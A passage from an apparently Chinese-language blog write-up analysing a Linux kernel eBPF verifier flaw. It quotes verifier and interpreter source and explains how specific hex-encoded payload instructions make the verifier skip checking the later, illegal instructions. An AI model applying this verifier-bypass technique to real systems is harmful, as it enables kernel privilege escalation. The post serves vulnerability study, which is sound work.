class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>check_cond_jmp_op</code>函数中，主要关注如下的代码片段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">    <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">        <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        *insn_idx += insn-&gt;off;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">         * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="number">1</span>, *insn_idx);</span><br><span class="line"><span class="keyword">if</span> (!other_branch)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    .........</span><br></pre></td></tr></table></figure><p>在这个代码片段中，检查了当前的跳转是否是确定的，也即“恒跳转”，如果是确定的，那么要么<code>insn_idx</code>前移(JEQ)，要么不动(JNE)，而如果不是确定的跳转，那么就说明之后的分支是有可能会被执行的，那么调用<code>push_stack</code>函数将下一个可能的分支压栈，等待进一步的校验</p><p>我们来分别看看第二句payload是否符合这个条件</p><ol><li><code>BPF_SRC(insn-&gt;code) == BPF_K</code>这一句：<code>0x55 &amp; 0x08 = 0x00 == BPF_K</code>, 符合条件</li><li><code>(opcode == BPF_JEQ || opcode == BPF_JNE)</code>这一句，<code>opcode = 0x50 == BPF_JNE</code>，符合条件</li><li><code>regs[insn-&gt;dst_reg].type == CONST_IMM</code>这一句，如果还记得，第一句payload中，<code>regs[insn-&gt;dst_reg].type</code>就被赋值为了<code>CONST_IMM</code>，符合条件</li><li><code>regs[insn-&gt;dst_reg].imm == insn-&gt;imm</code>这一句，由于等号两边数据类型都是有符号32位整型(很关键)，并且<code>0xffffffff == 0xffffffff</code>，所以符合条件</li></ol><p>既然四个都为<code>true</code>，并且<code>opcode = 0x50 == BPF_JNE</code>，那么直接返回，不执行之后的压入下一个可能分支的操作</p><p>到这儿同样也是没有什么问题，<code>check_cond_jmp_op</code>返回，<code>do_check</code>函数继续循环检查下一行指令，由于没有跳转，所以依然是顺序执行</p><p>那我们继续来看第三句指令 <code>\xb7\x00\x00\x00\x00\x00\x00\x00</code>，这一句没有什么特别的，和第一句payload很像，仅是为了保证下方第四句payload能够正常执行,原因如下代码所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于第四句payload的opcode为<code>BPF_EXIT</code>，所以要想保证第四句指令的执行不出错，那么就要保证<code>BPF_REG_0</code>中的值为0</p><p>故而第三句指令<code>\xb7\x00\x00\x00\x00\x00\x00\x00</code>即是将<code>BPF_REG_0</code>赋值为0</p><p>第三句指令执行完成后，我们继续看第四句指令<code>\x95\x00\x00\x00\x00\x00\x00\x00</code>，这一句就类似<code>exit(0)</code></p><p>这句指令在计算了class以及opcode后，会进入以下分支：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">                    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment">                 * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment">                 * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment">                 * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment">                 * something into it earlier</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123; <span class="comment">// 保证不泄露内核地址</span></span><br><span class="line">                    verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EACCES;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">process_bpf_exit:</span><br><span class="line">                insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">                <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    do_print_state = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br></pre></td></tr></table></figure><p>这里在经过安全检查后，尝试调用<code>pop_stack</code>函数，检查是否还有可能执行的分支等待检查，如果没有，那么直接跳出循环，结束检查，加载bpf指令</p><p>在我们的payload中，没有等待检查的分支，符合这一情况。那么换句话说，<code>do_check</code>函数只检查了前四句payload就认为之后的语句不会再被执行了，于是就放弃了对后续大段非法payload的校验</p><p>实际上，如果真实执行的流程与虚拟执行的流程完全一样，那么实际上是不存在漏洞的，我们的payload至始至终也只会执行前四句指令而已，但是，问题就出在了这两种流程的差别之处</p><p>那么我们看看真实执行的情况，以下代码均位于<code>kernel/bpf/core.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *    __bpf_prog_run - run eBPF program on a given context</span></span><br><span class="line"><span class="comment"> *    @ctx: is the data we are operating on</span></span><br><span class="line"><span class="comment"> *    @insn: is the array of eBPF instructions</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Decode and execute eBPF instructions.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">    u64 <span class="built_in">stack</span>[MAX_BPF_STACK / <span class="keyword">sizeof</span>(u64)];</span><br><span class="line">    u64 regs[MAX_BPF_REG], tmp;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span> *jumptable[<span class="number">256</span>] = &#123;</span><br><span class="line">        [<span class="number">0</span> ... <span class="number">255</span>] = &amp;&amp;default_label,</span><br><span class="line">        <span class="comment">/* Now overwrite non-defaults ... */</span></span><br><span class="line">        <span class="comment">/* 32 bit ALU operations */</span></span><br><span class="line">        [BPF_ALU | BPF_ADD | BPF_X] = &amp;&amp;ALU_ADD_X,</span><br><span class="line">        [BPF_ALU | BPF_ADD | BPF_K] = &amp;&amp;ALU_ADD_K,</span><br><span class="line">        [BPF_ALU | BPF_SUB | BPF_X] = &amp;&amp;ALU_SUB_X,</span><br><span class="line">        [BPF_ALU | BPF_SUB | BPF_K] = &amp;&amp;ALU_SUB_K,</span><br><span class="line">        [BPF_ALU | BPF_AND | BPF_X] = &amp;&amp;ALU_AND_X,</span><br><span class="line">        [BPF_ALU | BPF_AND | BPF_K] = &amp;&amp;ALU_AND_K,</span><br><span class="line">        [BPF_ALU | BPF_OR | BPF_X]  = &amp;&amp;ALU_OR_X,</span><br><span class="line">        [BPF_ALU | BPF_OR | BPF_K]  = &amp;&amp;ALU_OR_K,</span><br><span class="line">        [BPF_ALU | BPF_LSH | BPF_X] = &amp;&amp;ALU_LSH_X,</span><br><span class="line">        [BPF_ALU | BPF_LSH | BPF_K] = &amp;&amp;ALU_LSH_K,</span><br><span class="line">        [BPF_ALU | BPF_RSH | BPF_X] = &amp;&amp;ALU_RSH_X,</span><br><span class="line">        [BPF_ALU | BPF_RSH | BPF_K] = &amp;&amp;ALU_RSH_K,</span><br><span class="line">        [BPF_ALU | BPF_XOR | BPF_X] = &amp;&amp;ALU_XOR_X,</span><br><span class="line">        [BPF_ALU | BPF_XOR | BPF_K] = &amp;&amp;ALU_XOR_K,</span><br><span class="line">        [BPF_ALU | BPF_MUL | BPF_X] = &amp;&amp;ALU_MUL_X,</span><br><span class="line">        [BPF_ALU | BPF_MUL | BPF_K] = &amp;&amp;ALU_MUL_K,</span><br><span class="line">        [BPF_ALU | BPF_MOV | BPF_X] = &amp;&amp;ALU_MOV_X,</span><br><span class="line">        [BPF_ALU | BPF_MOV | BPF_K] = &amp;&amp;ALU_MOV_K,</span><br><span class="line">        [BPF_ALU | BPF_DIV | BPF_X] = &amp;&amp;ALU_DIV_X,</span><br><span class="line">        [BPF_ALU | BPF_DIV | BPF_K] = &amp;&amp;ALU_DIV_K,</span><br><span class="line">        [BPF_ALU | BPF_MOD | BPF_X] = &amp;&amp;ALU_MOD_X,</span><br><span class="line">        [BPF_ALU | BPF_MOD | BPF_K] = &amp;&amp;ALU_MOD_K,</span><br><span class="line">        [BPF_ALU | BPF_NEG] = &amp;&amp;ALU_NEG,</span><br><span class="line">        [BPF_ALU | BPF_END | BPF_TO_BE] = &amp;&amp;ALU_END_TO_BE,</span><br><span class="line">        [BPF_ALU | BPF_END | BPF_TO_LE] = &amp;&amp;ALU_END_TO_LE,</span><br><span class="line">        <span class="comment">/* 64 bit ALU operations */</span></span><br><span class="line">        [BPF_ALU64 | BPF_ADD | BPF_X] = &amp;&amp;ALU64_ADD_X,</span><br><span class="line">        [BPF_ALU64 | BPF_ADD | BPF_K] = &amp;&amp;ALU64_ADD_K,</span><br><span class="line">        [BPF_ALU64 | BPF_SUB | BPF_X] = &amp;&amp;ALU64_SUB_X,</span><br><span class="line">        [BPF_ALU64 | BPF_SUB | BPF_K] = &amp;&amp;ALU64_SUB_K,</span><br><span class="line">        [BPF_ALU64 | BPF_AND | BPF_X] = &amp;&amp;ALU64_AND_X,</span><br><span class="line">        [BPF_ALU64 | BPF_AND | BPF_K] = &amp;&amp;ALU64_AND_K,</span><br><span class="line">        [BPF_ALU64 | BPF_OR | BPF_X] = &amp;&amp;ALU64_OR_X,</span><br><span class="line">        [BPF_ALU64 | BPF_OR | BPF_K] = &amp;&amp;ALU64_OR_K,</span><br><span class="line">        [BPF_ALU64 | BPF_LSH | BPF_X] = &amp;&amp;ALU64_LSH_X,</span><br><span class="line">        [BPF_ALU64 | BPF_LSH | BPF_K] = &amp;&amp;ALU64_LSH_K,</span><br><span class="line">        [BPF_ALU64 | BPF_RSH | BPF_X] = &amp;&amp;ALU64_RSH_X,</span><br><span class="line">        [BPF_ALU64 | BPF_RSH | BPF_K] = &amp;&amp;ALU64_RSH_K,</span><br><span class="line">        [BPF_ALU64 | BPF_XOR | BPF_X] = &amp;&amp;ALU64_XOR_X,</span><br><span class="line">        [BPF_ALU64 | BPF_XOR | BPF_K] = &amp;&amp;ALU64_XOR_K,</span><br><span class="line">        [BPF_ALU64 | BPF_MUL | BPF_X] = &amp;&amp;ALU64_MUL_X,</span><br><span class="line">        [BPF_ALU64 | BPF_MUL | BPF_K] = &amp;&amp;ALU64_MUL_K,</span><br><span class="line">        [BPF_ALU64 | BPF_MOV | BPF_X] = &amp;&amp;ALU64_MOV_X,</span><br><span class="line">        [BPF_ALU64 | BPF_MOV | BPF_K] = &amp;&amp;ALU64_MOV_K,</span><br><span class="line">        [BPF_ALU64 | BPF_ARSH | BPF_X] = &amp;&amp;ALU64_ARSH_X,</span><br><span class="line">        [BPF_ALU64 | BPF_ARSH | BPF_K] = &amp;&amp;ALU64_ARSH_K,</span><br><span class="line">        [BPF_ALU64 | BPF_DIV | BPF_X] = &amp;&amp;ALU64_DIV_X,</span><br><span class="line">        [BPF_ALU64 | BPF_DIV | BPF_K] = &amp;&amp;ALU64_DIV_K,</span><br><span class="line">        [BPF_ALU64 | BPF_MOD | BPF_X] = &amp;&amp;ALU64_MOD_X,</span><br><span class="line">        [BPF_ALU64 | BPF_MOD | BPF_K] = &amp;&amp;ALU64_MOD_K,</span><br><span class="line">        [BPF_ALU64 | BPF_NEG] = &amp;&amp;ALU64_NEG,</span><br><span class="line">        <span class="comment">/* Call instruction */</span></span><br><span class="line">        [BPF_JMP | BPF_CALL] = &amp;&amp;JMP_CALL,</span><br><span class="line">        [BPF_JMP | BPF_CALL | BPF_X] = &amp;&amp;JMP_TAIL_CALL,</span><br><span class="line">        <span class="comment">/* Jumps */</span></span><br><span class="line">        [BPF_JMP | BPF_JA] = &amp;&amp;JMP_JA,</span><br><span class="line">        [BPF_JMP | BPF_JEQ | BPF_X] = &amp;&amp;JMP_JEQ_X,</span><br><span class="line">        [BPF_JMP | BPF_JEQ | BPF_K] = &amp;&amp;JMP_JEQ_K,</span><br><span class="line">        [BPF_JMP | BPF_JNE | BPF_X] = &amp;&amp;JMP_JNE_X,</span><br><span class="line">        [BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,</span><br><span class="line">        [BPF_JMP | BPF_JGT | BPF_X] = &amp;&amp;JMP_JGT_X,</span><br><span class="line">        [BPF_JMP | BPF_JGT | BPF_K] = &amp;&amp;JMP_JGT_K,</span><br><span class="line">        [BPF_JMP | BPF_JGE | BPF_X] = &amp;&amp;JMP_JGE_X,</span><br><span class="line">        [BPF_JMP | BPF_JGE | BPF_K] = &amp;&amp;JMP_JGE_K,</span><br><span class="line">        [BPF_JMP | BPF_JSGT | BPF_X] = &amp;&amp;JMP_JSGT_X,</span><br><span class="line">        [BPF_JMP | BPF_JSGT | BPF_K] = &amp;&amp;JMP_JSGT_K,</span><br><span class="line">        [BPF_JMP | BPF_JSGE | BPF_X] = &amp;&amp;JMP_JSGE_X,</span><br><span class="line">        [BPF_JMP | BPF_JSGE | BPF_K] = &amp;&amp;JMP_JSGE_K,</span><br><span class="line">        [BPF_JMP | BPF_JSET | BPF_X] = &amp;&amp;JMP_JSET_X,</span><br><span class="line">        [BPF_JMP | BPF_JSET | BPF_K] = &amp;&amp;JMP_JSET_K,</span><br><span class="line">        <span class="comment">/* Program return */</span></span><br><span class="line">        [BPF_JMP | BPF_EXIT] = &amp;&amp;JMP_EXIT,</span><br><span class="line">        <span class="comment">/* Store instructions */</span></span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_B] = &amp;&amp;STX_MEM_B,</span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_H] = &amp;&amp;STX_MEM_H,</span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_W] = &amp;&amp;STX_MEM_W,</span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_DW] = &amp;&amp;STX_MEM_DW,</span><br><span class="line">        [BPF_STX | BPF_XADD | BPF_W] = &amp;&amp;STX_XADD_W,</span><br><span class="line">        [BPF_STX | BPF_XADD | BPF_DW] = &amp;&amp;STX_XADD_DW,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_B] = &amp;&amp;ST_MEM_B,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_H] = &amp;&amp;ST_MEM_H,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_W] = &amp;&amp;ST_MEM_W,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_DW] = &amp;&amp;ST_MEM_DW,</span><br><span class="line">        <span class="comment">/* Load instructions */</span></span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_B] = &amp;&amp;LDX_MEM_B,</span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_H] = &amp;&amp;LDX_MEM_H,</span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_W] = &amp;&amp;LDX_MEM_W,</span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_DW] = &amp;&amp;LDX_MEM_DW,</span><br><span class="line">        [BPF_LD | BPF_ABS | BPF_W] = &amp;&amp;LD_ABS_W,</span><br><span class="line">        [BPF_LD | BPF_ABS | BPF_H] = &amp;&amp;LD_ABS_H,</span><br><span class="line">        [BPF_LD | BPF_ABS | BPF_B] = &amp;&amp;LD_ABS_B,</span><br><span class="line">        [BPF_LD | BPF_IND | BPF_W] = &amp;&amp;LD_IND_W,</span><br><span class="line">        [BPF_LD | BPF_IND | BPF_H] = &amp;&amp;LD_IND_H,</span><br><span class="line">        [BPF_LD | BPF_IND | BPF_B] = &amp;&amp;LD_IND_B,</span><br><span class="line">        [BPF_LD | BPF_IMM | BPF_DW] = &amp;&amp;LD_IMM_DW,</span><br><span class="line">    &#125;;</span><br><span class="line">    u32 tail_call_cnt = <span class="number">0</span>;</span><br><span class="line">    <span 